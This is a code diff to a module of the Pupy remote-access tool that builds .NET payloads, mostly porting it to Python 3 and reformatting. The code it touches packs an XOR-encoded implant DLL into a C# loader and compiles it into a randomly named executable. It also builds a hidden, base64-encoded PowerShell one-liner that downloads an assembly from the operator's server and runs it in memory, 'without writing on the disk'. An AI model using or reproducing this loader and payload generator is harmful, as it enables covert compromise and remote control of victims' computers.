@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-#Author: @n1nj4sec
-#Contributor(s):
+# Author: @n1nj4sec
+# Contributor(s):
 
 from __future__ import absolute_import
 from __future__ import division
@@ -11,7 +11,6 @@ import os
 import subprocess
 import tempfile
 import random
-import shlex
 
 from io import open
 from string import ascii_uppercase, ascii_lowercase
@@ -21,6 +20,8 @@ from base64 import b64encode
 from pupylib.PupyOutput import Success, Error, List
 from pupylib import ROOT
 
+from network.lib.convcompat import shlex
+
 TEMPLATE = join(ROOT, 'payload_templates', 'PupyLoaderTemplate.cs')
 
 PS_TEMPLATE = \
@@ -29,8 +30,12 @@ PS_TEMPLATE = \
   "'http://{link_ip}:{port}{landing_uri}')).GetTypes()[0].GetMethods(" \
   ")[0].Invoke($null,@())"
 
+
 class DotNetPayload(object):
-    def __init__(self, display, server, conf, rawdll, outpath=None, output_dir=None):
+    def __init__(
+        self, display, server, conf,
+            rawdll, outpath=None, output_dir=None):
+
         self.server = server
         self.display = display
         self.conf = conf
@@ -39,12 +44,15 @@ class DotNetPayload(object):
         self.rawdll = rawdll
 
     def gen_source(self, random_path=False):
-        with open(TEMPLATE, 'rb') as f:
+        with open(TEMPLATE, 'r') as f:
             template_source = f.read()
 
         self.display(Success('packing pupy into C# source ...'))
 
-        encoded = '{' + ','.join(str(c^0xFF) for c in self.rawdll) + '}'
+        encoded = '{' + ','.join(
+            str(c ^ 0xFF) for c in self.rawdll
+        ) + '}'
+
         content = template_source.replace('<PUPYx64_BYTES>', encoded)
 
         if not self.outpath or random_path:
@@ -52,7 +60,8 @@ class DotNetPayload(object):
                 dir=self.output_dir or '.',
                 prefix='pupy_',
                 suffix='.cs',
-                delete=False
+                delete=False,
+                mode='w'
             )
         else:
             outpath_src, _ = splitext(self.outpath) + '.cs'
@@ -69,7 +78,9 @@ class DotNetPayload(object):
             outfile = os.path.join(
                 self.output_dir or '.', 'pupy_'+''.join(
                     random.choice(
-                        ascii_uppercase + ascii_lowercase) for _ in range(8)) + '.exe')
+                        ascii_uppercase + ascii_lowercase) for _ in range(8)
+                ) + '.exe'
+            )
         else:
             outfile = self.outpath
 
@@ -82,10 +93,10 @@ class DotNetPayload(object):
                 from pupylib import PupyConfig
                 config = PupyConfig()
 
-            sdk = config.get('gen', 'mcs_sdk', 4)
+            sdk = config.get('gen', 'mcs_sdk', fallback=4)
             options = ' '.join([
                 options,
-                config.get('gen', 'mcs_options', '') or ''
+                config.get('gen', 'mcs_options', fallback='') or ''
             ])
 
             if options:
@@ -104,12 +115,16 @@ class DotNetPayload(object):
             command.extend([
                 '-unsafe',
                 '-noconfig',
-                '-sdk:{}'.format(sdk),
-                '-OUT:{}'.format(outfile),
+                '-sdk:' + sdk,
+                '-OUT:' + outfile,
                 sourcepath
             ])
 
-            self.display(Success('compiling via mono command: {}'.format(' '.join(command))))
+            self.display(
+                Success('compiling via mono command: {}'.format(
+                    ' '.join(command))
+                )
+            )
 
             try:
                 output = subprocess.check_output(command).strip()
@@ -117,11 +132,22 @@ class DotNetPayload(object):
                     self.display(output)
 
             except subprocess.CalledProcessError as e:
-                self.display(Error('Mono compilation failed: {}'.format(e.output)))
+                self.display(
+                    Error(
+                        'Mono compilation failed: {}'.format(e.output)
+                    )
+                )
+
                 return None
 
             except OSError:
-                self.display(Error("mcs compiler can't be found ... install mono-mcs package"))
+                self.display(
+                    Error(
+                        'mcs compiler can\'t be found. '
+                        'install mono-mcs package'
+                    )
+                )
+
                 return None
 
         finally:
@@ -164,6 +190,8 @@ def dotnet_serve_payload(display, server, rawdll, conf, link_ip=None):
 
     display(List([
         'powershell -w hidden -enc "{}"'.format(
-            b64encode(command)),
+            b64encode(command).decode('latin-1')),
     ], caption=Success(
-        'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
+        'Copy/paste this one-line loader to deploy pupy '
+        'without writing on the disk'))
+    )
